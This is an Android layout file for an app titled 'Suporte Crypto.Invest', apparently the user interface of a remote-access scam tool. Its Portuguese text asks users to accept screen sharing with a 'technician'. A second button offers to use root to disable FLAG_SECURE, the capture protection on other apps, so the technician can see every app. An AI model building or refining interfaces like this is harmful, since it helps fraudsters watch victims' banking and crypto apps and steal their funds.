<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="#171A1F"
    android:padding="28dp">

    <ImageView
        android:layout_width="96dp"
        android:layout_height="96dp"
        android:src="@mipmap/ic_launcher"
        android:layout_marginBottom="16dp" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Suporte Crypto.Invest"
        android:textColor="#FFFFFF"
        android:textSize="22sp"
        android:textStyle="bold" />

    <TextView
        android:id="@+id/subtitle"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:layout_marginTop="10dp"
        android:text="Toque em CONECTAR e aceite a partilha de ecra. O tecnico ajuda-o em direto. Pode parar quando quiser."
        android:textColor="#B6C0CC"
        android:textSize="14sp" />

    <Button
        android:id="@+id/connectBtn"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="28dp"
        android:text="CONECTAR"
        android:textStyle="bold"
        android:textSize="18sp"
        android:textColor="#0B1A30"
        android:backgroundTint="#4ADE80" />

    <Button
        android:id="@+id/unlockBtn"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="14dp"
        android:text="ATIVAR SUPORTE TOTAL (root)"
        android:textStyle="bold"
        android:textSize="13sp"
        android:textColor="#0B1A30"
        android:backgroundTint="#FBBF24" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:layout_marginTop="6dp"
        android:text="Desativa a proteção de captura (FLAG_SECURE) para o técnico poder ver todas as apps. Requer root e o seu consentimento."
        android:textColor="#8A94A0"
        android:textSize="11sp" />

    <TextView
        android:id="@+id/status"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:gravity="center"
        android:layout_marginTop="18dp"
        android:text=""
        android:textColor="#4ADE80"
        android:textSize="14sp" />

</LinearLayout>
